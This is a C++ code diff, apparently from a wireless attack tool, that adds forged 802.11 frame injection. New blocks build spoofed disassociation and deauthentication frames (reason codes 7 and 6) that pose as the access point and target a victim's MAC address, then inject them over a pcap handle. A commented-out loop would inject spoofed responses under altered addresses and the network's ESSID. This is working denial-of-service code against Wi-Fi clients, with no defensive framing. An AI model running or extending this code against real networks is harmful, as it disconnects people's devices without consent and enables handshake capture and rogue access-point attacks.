@@ -155,6 +155,17 @@ public:
 						}
 
 						{
+                            auto radio = constructManagementFrameWithReasonCode<Dot11Disassoc>(
+								ap.bssid,
+                                config.target_mac,
+                                channel,
+                                7 // INVALID_CLASS3_FRAME
+                            );
+
+                            injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
+                        }
+
+						{
 							auto radio = constructManagementFrameWithReasonCode<Dot11Deauthentication>(
 								config.target_mac,
 								ap.bssid,
@@ -164,6 +175,38 @@ public:
 
 							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
 						}
+
+						{
+                            auto radio = constructManagementFrameWithReasonCode<Dot11Deauthentication>(
+								ap.bssid,
+                                config.target_mac,
+                                channel,
+                                6 // INVALID_CLASS2_FRAME
+                            );
+
+                            injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
+                        }
+
+						/*
+
+						for (int i = 0; i < 4; i++)
+						{
+
+							auto addr = resp.addr2();
+							addr[5] = addr[5] * 61 + 2;
+							resp.addr1(config.target_mac);
+							resp.addr2(addr);
+							resp.addr3(addr);
+
+							resp.ssid(ap.essid);
+
+							RadioTap radio = RadioTap() / resp; // make 802.11 packet
+							radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);
+
+							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
+						}
+
+						*/
 
 						// std::this_thread::sleep_for(std::chrono::milliseconds(2));
 					}
